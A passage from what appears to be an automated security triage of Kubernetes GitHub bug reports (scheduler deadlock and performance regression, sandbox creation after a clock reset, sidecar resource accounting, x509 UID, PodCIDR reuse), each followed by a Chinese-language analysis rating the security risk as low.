    - --leader-elect=true
    image: registry.k8s.io/kube-scheduler:v1.30.0
    imagePullPolicy: IfNotPresent
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 127.0.0.1
        path: /healthz
        port: 10259
        scheme: HTTPS
      initialDelaySeconds: 10
      periodSeconds: 10
      timeoutSeconds: 15
    name: kube-scheduler
    resources:
      requests:
        cpu: 100m
    startupProbe:
      failureThreshold: 24
      httpGet:
        host: 127.0.0.1
        path: /healthz
        port: 10259
        scheme: HTTPS
      initialDelaySeconds: 10
      periodSeconds: 10
      timeoutSeconds: 15
    volumeMounts:
    - mountPath: /etc/kubernetes/scheduler.conf
      name: kubeconfig
      readOnly: true
    - mountPath: /etc/kubernetes/allow-list.yaml
      name: allowlist
      readOnly: true
  hostNetwork: true
  priority: 2000001000
  priorityClassName: system-node-critical
  securityContext:
    seccompProfile:
      type: RuntimeDefault
  volumes:
  - hostPath:
      path: /etc/kubernetes/scheduler.conf
      type: FileOrCreate
    name: kubeconfig
  - hostPath:
      path: /etc/kubernetes/allow-list.yaml
      type: File
    name: allowlist
```
Then check the pod's log
```
root@dev-control-plane:/etc/kubernetes/manifests# kubectl logs -n kube-system kube-scheduler-dev-control-plane -f
```

#### Anything else we need to know?

It should be an easy fix by removing the locking logic https://github.com/kubernetes/kubernetes/blob/c15581b277e9e42d830898357fdbd92dcf7981c6/staging/src/k8s.io/component-base/metrics/opts.go#L366 and adding more test to cover this.

Also, I've sent a PR to update the documentation to apply the correct manifest format 
https://github.com/kubernetes/website/pull/48283

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
Client Version: v1.30.0
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
经过分析，该Issue描述了在组件初始化时设置`--allow-metric-labels-manifest`参数会导致组件一直挂起。原因是在`SetLabelAllowListFromManifest`函数中错误地对`allowListLock`进行了二次锁定，导致死锁。虽然该问题会导致组件不可用，具有拒绝服务（DoS）的风险，但需要攻击者具有修改组件启动参数或配置文件的权限，才能触发该漏洞。这通常需要较高的权限，普通用户无法利用。因此，根据风险判断标准第4条，该漏洞不属于高风险，CVSS评分在High以下，属于低风险安全问题。

---

## Issue #127948 PodSandbox cannot be created if the time in the server is changed by incident

- Issue 链接：[#127948](https://github.com/kubernetes/kubernetes/issues/127948)

### Issue 内容

#### What happened?

Recently the CMOS battery is faulty, we did a change and rebooted the node. After rebooting, we found almost of pods cannot be created by kubelet + containerd.

The timeline is like this
1. **_time:  Sep  26  19:55:45 -07 2024_**. We have a pod created at **_2024-09-05T14:20:50.537022918-07:00_**
  ```
 aff8aea34f502       4 weeks ago         Ready            x-generic22-kdw2k              sdprod              0                   (default)
  ```
2. Shutdown and change the CMOS battery, the time is set to **_Tue Nov 21 13:57 - 05:46_**. 
3. After rebooting the node, kubelet started to work before time is synced by chrony. It will create a new sandbox 0b4c9da99f482 with timestamp _**2023-11-21T13:57:27.095899765-07:00**_
```
aff8aea34f502       4 weeks ago         NotReady            x-generic22-kdw2k                        sdprod              0                   (default)
0b4c9da99f482       10 months ago       Ready            x-generic22-kdw2k                    sdprod             1                   (default)
```
4. After the time is synced by chrony, kubelet will re-create the sandbox because the ready sandbox is not the latest one. The latest one is aff8aea34f502. The attempt is 0. So kubelet will use attempt +1 = 1 as the new attempt. but creating sandbox will fail. 
```
aff8aea34f502       4 weeks ago         NotReady            x-generic22-kdw2k                        sdprod              0                   (default)
0b4c9da99f482       10 months ago       NotReady            x-generic22-kdw2k                    sdprod             1                   (default)
```
The error is like this.
```
 kubelet[64266]: E1008 19:17:18.914095   64266 pod_workers.go:1300] "Error syncing pod, skipping" err="failed to "CreatePodSandbox" for "x-generic22-kdw2k_sdprod(e7a70473-71a5-40de-a60e-5da5e756f7ff)\" with CreatePodSandboxError: "Failed to create sandbox for pod "x-generic22-kdw2k_sdprode7a70473-71a5-40de-a60e-5da5e756f7ff)": rpc error: code = Unknown desc = failed to reserve sandbox name "x-generic22-kdw2k_sdprod_e7a70473-71a5-40de-a60e-5da5e756f7ff_1": name "x-generic22-kdw2k_sdprod_e7a70473-71a5-40de-a60e-5da5e756f7ff_1" is reserved for\"0b4c9da99f48214325378cc779b799d8f2becae18e9ea9d0f3fb72c42d8fbd98"" pod="sdprod/ x-generic22-kdw2k" podUID="e7a70473-71a5-40de-a60e-5da5e756f7ff" 

```

https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/kuberuntime/util/util.go#L42

```
func PodSandboxChanged(pod *v1.Pod, podStatus *kubecontainer.PodStatus) (bool, uint32, string) {
...
// Needs to create a new sandbox when readySandboxCount > 1 or the ready sandbox is not the latest one.
	sandboxStatus := podStatus.SandboxStatuses[0]
	if readySandboxCount > 1 {
		klog.V(2).InfoS("Multiple sandboxes are ready for Pod. Need to reconcile them", "pod", klog.KObj(pod))
		return true, sandboxStatus.Metadata.Attempt + 1, sandboxStatus.Id
	}
	if sandboxStatus.State != runtimeapi.PodSandboxState_SANDBOX_READY {
		klog.V(2).InfoS("No ready sandbox for pod can be found. Need to start a new one", "pod", klog.KObj(pod))
		return true, sandboxStatus.Metadata.Attempt + 1, sandboxStatus.Id
	}
```
When we calculate the attempt, is it better to get the maximum value of all the sandboxStatus.Metadata.Attempt?






#### What did you expect to happen?

Use attempt =2 to create the new sandbox and the pod can be up.

#### How can we reproduce it (as minimally and precisely as possible)?

1. disable chrony
2. change the date to a few days ago. It must be before the sandbox creation timestamp.
3. reboot
4. kubelet will be up
5. new sandbox will be created
6. enable chrony

#### Anything else we need to know?

_No response_

#### Kubernetes version



```
1.18.12
```


#### Cloud provider

<details>
none
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在服务器时间被意外修改的情况下，PodSandbox无法被创建的问题。具体情况是，当服务器的CMOS电池故障，导致系统时间被重置，kubelet在时间同步之前启动，会创建一个带有错误时间戳的sandbox。在时间同步后，kubelet尝试重新创建sandbox，但由于时间戳问题，导致创建失败，Pod无法正常启动。

从安全角度考虑，攻击者如果能够修改服务器的系统时间，可能会触发该问题，导致Kubernetes集群中的Pod无法创建，造成拒绝服务（DoS）攻击。然而，修改系统时间需要root权限，只有具备高权限的用户才能执行此操作。

根据风险判断标准第4条，对于需要高权限才能实施的拒绝服务攻击，不应判断为高风险，CVSS评级在high以下。因此，该问题的安全风险评级为低风险。

**复现过程：**

```json
[
  {
    "cmd": "systemctl stop chronyd",
    "explain": "停止时间同步服务chrony，防止时间自动同步。"
  },
  {
    "cmd": "date -s '2023-09-01 12:00:00'",
    "explain": "将系统日期修改为过去的时间，例如2023年9月1日12:00:00。"
  },
  {
    "cmd": "reboot",
    "explain": "重启系统，使修改的时间生效。"
  },
  {
    "cmd": "systemctl start kubelet",
    "explain": "启动kubelet服务。"
  },
  {
    "cmd": "systemctl start chronyd",
    "explain": "启动chrony服务，恢复系统时间同步。"
  },
  {
    "cmd": "kubectl get pods",
    "explain": "检查Pod状态，此时会发现Pod无法正常创建。"
  }
]
```

---

## Issue #127912 Regression in Scheduler Performance in Large Scale Clusters

- Issue 链接：[#127912](https://github.com/kubernetes/kubernetes/issues/127912)

### Issue 内容

#### What happened?

Scheduler throughput and Performance has regressed in 1.31 when compared to 1.30

#### What did you expect to happen?

Scheduler throughput and Performance should at least stay same as 1.30 on 1.31 or improve. 


#### How can we reproduce it (as minimally and precisely as possible)?

I'm leveraging the [test](https://github.com/kubernetes/perf-tests/blob/master/clusterloader2/testing/scheduler-throughput/config.yaml) that I have written to measure scheduler throughput and performance by directly creating pods to APIServer without KCM controllers in the picture.

Settings:

- You can run this test with [this](https://github.com/kubernetes/perf-tests/blob/master/clusterloader2/testing/scheduler-throughput/config.yaml#L19) QPS set to `1000` and total pods [here](https://github.com/kubernetes/perf-tests/blob/master/clusterloader2/testing/scheduler-throughput/config.yaml#L1C4-L1C32 ) set to 50k 


###### Test results: You would get roughly following latency and throughput numbers for `1.30v` 

Latency: 

```
    {
      "data": {
        "Perc50": 4853.606009,
        "Perc90": 6501.635529,
        "Perc99": 7152.44798
      },
      "unit": "ms",
      "labels": {
        "Metric": "pod_startup"
      }
    },
    {
      "data": {
        "Perc50": 3750.943,
        "Perc90": 5345.859,
        "Perc99": 5861.101
      },
      "unit": "ms",
      "labels": {
        "Metric": "create_to_schedule"
      }
    }
``` 

Throughput:



```
{
  "perc50": 803,
  "perc90": 856,
  "perc99": 936,
  "max": 936
}
```




###### Test results: You would get roughly following latency and throughput numbers for `1.31v` 

Latency:

```
    {
      "data": {
        "Perc50": 10675.556409,
        "Perc90": 17805.60988,
        "Perc99": 19445.20954
      },
      "unit": "ms",
      "labels": {
        "Metric": "pod_startup"
      }
    }
    
        {
      "data": {
        "Perc50": 9579.25,
        "Perc90": 16696.174,
        "Perc99": 18275.346
      },
      "unit": "ms",
      "labels": {
        "Metric": "create_to_schedule"
      }
    },
  ```
  
  Throughput:
  
  ```
  {
  "perc50": 638,
  "perc90": 683,
  "perc99": 713,
  "max": 713
}

```
  
  
  
  




#### Anything else we need to know?



You can see that on 1.31v, the latency for `create_to_schedule` phase  increased 3X or more ( I have posted the one that has lowest latency and highest throughput among other tests that I have run) and Throughput has reduced significantly  from ~936 to ~704 at peak/p99.



When I looked at the  pprof of the runs on 1.30v and 1.31v, major differences showed up  as following:

-  Prometheus.(*gauge).Add [k8s.io/client-go/util/workqueue.ParallelizeUntil.func1]  (main contributing factor)
- k8s.io/kubernetes/pkg/scheduler/framework/parallelize.Parallelizer.Until.func1
k8s.io/kubernetes/pkg/scheduler/framework/parallelize/parallelism.go ( overall this is slightly higher on 1.31v i.e; ~57% vs ~46% on 1.30v) 

###### 1.31v pprof 

<img width="1575" alt="Screenshot 2024-10-07 at 5 19 48 PM" src="https://github.com/user-attachments/assets/e6bfd4c8-4e6b-4dc0-8868-1c63d8435913">


<img width="1562" alt="Screenshot 2024-10-07 at 5 20 19 PM" src="https://github.com/user-attachments/assets/f82c4ca7-c881-435e-91b1-818856968323">



###### 1.30v pprof

<img width="1576" alt="Screenshot 2024-10-07 at 5 07 22 PM" src="https://github.com/user-attachments/assets/9d287529-fcfc-433a-84f5-89172c42d483">
<img width="1590" alt="Screenshot 2024-10-07 at 5 21 18 PM" src="https://github.com/user-attachments/assets/a73647cf-cf45-4fe0-a5e9-e549eab053c8">



You can see that % of cpu cycles/time spent is more than doubled for Prometheus operations for the same amount of work i.e 50k pods with 1K QPS  ^^^


I can post flame graphs as well 


##### Food for thought: 

Generally we should `batch prometheus gauge operations` for performance improvement given the CPU cycles consumption in Scheduler_one go routine (as we schedule pods serially in one go routine given the nature of Scheduler) for better performance. Also, I don't think consumers would need precision at the current level that we are doing today. Generally users scrape prometheus metrics at the very least at 10sec, 30sec, 1min or 5mins interval. Would like to know what community thinks about this ? At least we should have a gating feature to configure the precision of omitting Prometheus metrics ?

#### Kubernetes version

<details>

```console
$ kubectl version

sh-4.2$ kubectl version
Client Version: v1.30.4-eks-a737599
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.5-eks-ce1d5eb
```

```
sh-4.2$ kubectl version
Client Version: v1.31.0-eks-a737599
Kustomize Version: v5.4.2
Server Version: v1.31.0-eks-a737599

````

</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
```
NAME="Amazon Linux"
VERSION="2"
ID="amzn"
ID_LIKE="centos rhel fedora"
VERSION_ID="2"
PRETTY_NAME="Amazon Linux 2"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2"
HOME_URL="https://amazonlinux.com/"
SUPPORT_END="2025-06-30"
```
$ uname -a
```
Linux ip-172-16-60-69.us-west-2.compute.internal 5.10.224-212.876.amzn2.x86_64 #1 SMP Thu Aug 22 16:55:24 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue报告了在Kubernetes 1.31版本中，调度器（Scheduler）的性能在大型集群中出现了回归，相较于1.30版本，吞吐量和性能都有所下降。这主要是由于Prometheus指标更新造成的CPU消耗增加，影响了调度器的性能。

从安全角度分析，如果攻击者能够利用这个性能问题，可能会导致拒绝服务（DoS）攻击。例如，攻击者可以通过创建大量的Pod来增加调度器的负载，导致调度器无法及时响应其他用户的调度请求。

然而，根据风险判断标准第4条，若攻击者需要一定的权限（如创建或修改权限）才能实施攻击，则不应判断为高风险。在Kubernetes中，创建Pod需要具备相应的权限，普通未授权用户无法执行此操作。因此，该风险需要降级处理。

此外，该问题不涉及命令执行、容器逃逸、提权等高风险问题，也未在多用户场景下使低权限用户影响到其他高权限用户。

综上所述，虽然该Issue中存在被利用进行拒绝服务攻击的可能性，但由于需要攻击者具备创建Pod的权限，且未涉及高风险的安全漏洞，故风险评级判断为低风险。

---

## Issue #127868 [SidecarContainers] Scheduler accounting sidecar resource requests as initContainers

- Issue 链接：[#127868](https://github.com/kubernetes/kubernetes/issues/127868)

### Issue 内容

#### What happened?

As per [Sidecars KEP](https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/753-sidecar-containers/README.md#resources-calculation-for-scheduling-and-pod-admission), resources calculations for scheduling pods with sidecars is : Max ( Max( each InitContainerUse ) , Sum(Sidecar Containers) + Sum(Containers) ), but [scheduler logic](https://github.com/kubernetes/kubernetes/blob/2d31ec00273c34390ec77637fb4ff96234885bca/pkg/scheduler/framework/types.go#L950-L951) is using Max(RegularContainers, InitContainers) to calculate resources.


#### What did you expect to happen?

Resource Requests = Max ( Max( each InitContainerUse ) , Sum(Sidecar Containers) + Sum(Containers) )

#### How can we reproduce it (as minimally and precisely as possible)?

https://github.com/kubernetes/kubernetes/blob/2d31ec00273c34390ec77637fb4ff96234885bca/pkg/scheduler/framework/types.go#L950-L951

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue指出，在Kubernetes中，当使用sidecar容器时，调度器在计算Pod的资源请求时，未正确考虑sidecar容器的资源，导致资源计算不准确。

根据Sidecars KEP，资源计算应该是：Resource Requests = Max ( Max(each InitContainerUse), Sum(Sidecar Containers) + Sum(Containers) )。

但是调度器的逻辑使用了 Max(RegularContainers, InitContainers) 来计算资源，没有正确地将Sidecar Containers的资源计入。

这可能导致Pod调度到资源不足的节点，造成节点资源超载，可能引发拒绝服务（DoS）风险。

然而，要利用这一问题，攻击者需要具备在集群中创建特定Pod的权限，即需要一定的权限。

根据风险判断标准中的第4条，当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险。

因此，该Issue涉及到的安全风险评级为低风险。

---

## Issue #127860 x509 clients missing User.Uid info for authorization and admission

- Issue 链接：[#127860](https://github.com/kubernetes/kubernetes/issues/127860)

### Issue 内容

#### What happened?

For all other authenticator types, the authenticator supplies a UID for the user. When an authorizer or admission validator evaluates a request, the uid for x509 users is an empty string.

#### What did you expect to happen?

I expected a UID to be populated by the x509 authenticator if set in the certificate. I'd also expect `kubeadm` to have a flag in the `kubeadm kubeconfig user` subcommand to support setting it like `--client-name` and `--org` populate username and groups respectively, so something like `--client-uid`. 

For Kubernetes-created node client certs should probably have the node object's `uid`. Other client x509 certs such as Kube-apiserver client cert for node proxy or client certs from the CSR  API, its not clear if/what Kubernetes should set. 



#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a [kind](https://kind.sigs.k8s.io/) cluster
2. Run `kubectl auth whoami`. No UID is returned as it is for other auth formats

```
kubectl auth whoami
ATTRIBUTE   VALUE
Username    kubernetes-admin
Groups      [kubeadm:cluster-admins system:authenticated]
```


#### Anything else we need to know?

As [discussed in #sig-auth](https://kubernetes.slack.com/archives/C0EN96KUY/p1727984474325949), x509 has an optional field for UID. Go's `crypto/x509` doesn't have a named field for it, but it can be set or accessed. 


#### Kubernetes version

All versions

#### Cloud provider

N/A

#### OS version

N/A

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
低风险

**判断依据：**  
- **问题描述**：在 Kubernetes 中，当使用 x509 证书进行身份认证时，认证器不会为用户提供 UID 信息。而其他类型的认证器会为用户提供 UID。当授权器或准入控制器评估请求时，x509 用户的 UID 为空字符串。

- **可能的安全影响**：由于 x509 用户的 UID 为空，在某些依赖 UID 进行权限控制、访问控制或审计的场景中，可能导致无法准确识别用户身份，进而可能存在权限提升或绕过安全策略的风险。例如，攻击者可能冒充其他用户，或无法在审计日志中准确追踪用户操作。

- **风险评估**：该问题可能会影响到依赖 UID 进行精细化权限控制的自定义组件或第三方插件，但在默认配置下，Kubernetes 主要使用用户名和用户组进行权限管理，UID 的缺失一般不会直接导致严重的安全问题。鉴于攻击者无法直接利用该缺陷进行攻击，且需要特定的依赖条件，因此将风险评级定为低风险。

---

## Issue #127817 FsGroupPolicy ReadWriteOnceWithFSType should apply to ReadWriteOncePod access mode

- Issue 链接：[#127817](https://github.com/kubernetes/kubernetes/issues/127817)

### Issue 内容

#### What happened?

The recursive `chown` behavior that kubelet does for RWO volume access mode with FsGroupPolicy `ReadWriteOnceWithFSType` is not applied for RWOP access mode.  Since RWOP is even more restrictive than RWO, there should be no issues extending this default behavior to RWOP.

#### What did you expect to happen?

When a persistent volume is attached by a CSI provisioner that advertises an FsGroupPolicy of `ReadWriteOnceWithFSType`, kubelet should do a recursive `chown` to apply the Fsgroup from a pod SecurityContext for RWOP access mode.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Install CSI provisioner with FsGroupPolicy of `ReadWriteOnceWithFSType` (the default).
2. Create minimal matching storage class with non-empty `fsType` parameter.
3. Create a PVC/PV with `ReadWriteOncePod` access mode.
4. Create a pod with a securityContext having `fsGroup` value.
5. Observe that kubelet does not perform the recursive `chown` on the files in the attached PV.

#### Anything else we need to know?

This fix could be a one-line change here:
https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/volume/csi/csi_mounter.go#L474

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
```

</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
$ uname -a
Linux node1 5.4.0-186-generic #206-Ubuntu SMP Fri Apr 26 12:31:10 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux


# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
N/A
```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
CSI: https://github.com/NetApp/trident
</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
Kubernetes 在挂载具有 FsGroupPolicy 为 `ReadWriteOnceWithFSType` 的持久卷时，针对访问模式为 `ReadWriteOnce`（RWO）的卷，kubelet 会执行递归的 `chown` 操作，以应用来自 Pod `SecurityContext` 中的 `fsGroup`。然而，对于访问模式为 `ReadWriteOncePod`（RWOP）的卷，kubelet 并未执行该递归 `chown` 操作。

这可能导致使用 RWOP 访问模式的 Pod 无法正确设置卷中文件的权限，从而可能导致以下安全风险：

1. **权限不足**：Pod 内的进程可能无法访问卷中文件，影响应用正常运行。
2. **权限过高**：如果卷中文件的权限未被正确设置，可能默认具有较高的权限，潜在地允许不应有的访问。

但是，以上风险需要具备对 Kubernetes 集群的操作权限才能触发，攻击者需要能够创建或修改 Pod 的权限。根据风险判断标准第4条，当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险，CVSS 评级在 high 以下。

因此，该问题存在一定的安全风险，但不属于高风险漏洞。

---

## Issue #127793 [SidecarContainers] Failed to get proper phase after the node reboot

- Issue 链接：[#127793](https://github.com/kubernetes/kubernetes/issues/127793)

### Issue 内容

#### What happened?

If a pod has an init container with restartPolicy "Always" (sidecar), it may lose the pending phase after the node reboot and start the regular containers before initializing the init containers.

/sig node
/priority important-soon
/kind bug

This is similar to https://github.com/kubernetes/kubernetes/issues/126650, but separated as it only affects the pod with restartable init containers.

#### What did you expect to happen?

After the node reboot, the remaining pod should start from the pending phase and run the init containers one by one to initialize.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create and initialize the pod with an init container with "Always" container restart policy.
2. Restart the node.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了Kubernetes中的一个问题：当一个Pod包含restartPolicy为"Always"的init容器（即sidecar容器）时，如果节点重启，Pod可能会跳过init容器的执行，直接启动主容器。这可能导致主容器在未经过正确初始化的情况下启动，可能引发应用程序的不正确行为。

从安全角度来看，如果init容器负责执行安全初始化操作（例如配置安全策略、加载安全证书等），跳过这些步骤可能导致主容器在不安全的状态下运行。然而，这一问题需要节点重启才能触发，且节点重启通常需要管理员权限，普通攻击者无法轻易触发。

根据风险判断标准：
1. 攻击者难以利用该风险（第1条）。
4. 攻击需要一定权限，故应降低风险评级（第4条）。

综上所述，该Issue存在一定的安全风险，但由于攻击者难以利用，风险评级为低风险。

---

## Issue #127792 kube-controller-manager re-allocating already used PodCIDR (v1.31)

- Issue 链接：[#127792](https://github.com/kubernetes/kubernetes/issues/127792)

### Issue 内容

#### What happened?

Since upgrading to Kubernetes v1.31 we have occasional observed that `kube-controller-manager` allocates a PodCIDR for a new node which is already allocated for an existing node in the cluster. We have about 200 clusters with a combined number of ca. 6k-10k nodes (autoscaling). It has happened about 10 times since upgrading a week ago, so it's rather rare but breaks the networking between the affected nodes when it happens.

We use flannel as overlay network and it uses the podCIDR assigned by `kube-controller-manager`. When a new node gets an existing podCIDR assigned, then the new node doesn't get ready and it gets terminated after 10 min. We check that the node is routable by all other nodes before we mark the node ready. This never happens because the podCIDR already points to another node in the cluster. When the new node is deleted it has the very unfortunate side effect that all flannels detect the node is deleted and they delete the routes for the podCIDR, problem is just that most nodes will have routes for the other node with the same podCIDR and this then stops working.

Terminating the affected node is the best way to resolve the issue but obviously not sustainable.

#### What did you expect to happen?

`kube-controller-manager` should _never_ allocate the same podCIDR to multiple nodes at the same time.

#### How can we reproduce it (as minimally and precisely as possible)?

We haven't found a predictable way to reproduce it.

We run with the pod CIDR range: `10.2.0.0/15`.

#### Anything else we need to know?

This is how we configure `kube-controller-manager`: https://github.com/zalando-incubator/kubernetes-on-aws/blob/dev/cluster/node-pools/master-default/userdata.yaml#L581-L648 (the image is vanilla Kubernetes built from source and hosted in a private registry)

Here is an example from one cluster with logs:

*Node 1 (original)*:
name: `ip-172-31-14-210.eu-central-1.compute.internal`
podCIDR: `10.2.4.0/24`

*Node 2 (new)*:
name: `ip-172-31-15-241.eu-central-1.compute.internal`
podCIDR: `10.2.4.0/24`

`kube-controller-manager`  logs filtered for the node `ip-172-31-14-210.eu-central-1.compute.internal`:

```
I1001 16:54:22.944453       1 actual_state_of_world.go:540] "Failed to update statusUpdateNeeded field in actual state of world" logger="persistentvolume-attach-detach-controller" err="Failed to set statusUpdateNeeded to needed true, because nodeName=\"ip-172-31-14-210.eu-central-1.compute.internal\" does not exist"
I1001 16:54:23.001587       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 16:54:23.054817       1 node_lifecycle_controller.go:884] "Missing timestamp for Node. Assuming now as a timestamp" logger="node-lifecycle-controller" node="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 16:56:52.839072       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:01:57.639919       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:03:00.584960       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:03:19.873337       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:08:26.273278       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:13:32.137435       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:18:37.436066       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:20:50.207426       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:22:06.023052       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:22:06.058496       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:22:11.270715       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:22:11.376488       1 reconciler.go:275] "attacherDetacher.DetachVolume started" logger="persistentvolume-attach-detach-controller" node="ip-172-31-14-210.eu-central-1.compute.internal" volumeName="kubernetes.io/csi/ebs.csi.aws.com^vol-01a06d931a5cbc177"
I1001 17:22:11.386310       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:22:11.392521       1 operation_generator.go:1539] Verified volume is safe to detach for volume "pvc-0ecc2568-e98d-430d-aa57-d545f7cb8c85" (UniqueName: "kubernetes.io/csi/ebs.csi.aws.com^vol-01a06d931a5cbc177") on node "ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:22:18.918976       1 operation_generator.go:437] DetachVolume.Detach succeeded for volume "pvc-0ecc2568-e98d-430d-aa57-d545f7cb8c85" (UniqueName: "kubernetes.io/csi/ebs.csi.aws.com^vol-01a06d931a5cbc177") on node "ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:23:15.637313       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
```

`kube-controller-manager` logs filtered for the node: `ip-172-31-15-241.eu-central-1.compute.internal`:

```
I1001 17:22:45.543797       1 actual_state_of_world.go:540] "Failed to update statusUpdateNeeded field in actual state of world" logger="persistentvolume-attach-detach-controller" err="Failed to set statusUpdateNeeded to needed true, because nodeName=\"ip-172-31-15-241.eu-central-1.compute.internal\" does not exist"
I1001 17:22:45.647668       1 range_allocator.go:422] "Set node PodCIDR" logger="node-ipam-controller" node="ip-172-31-15-241.eu-central-1.compute.internal" podCIDRs=["10.2.4.0/24"]
I1001 17:22:45.648019       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:45.648088       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:45.695174       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:45.702231       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
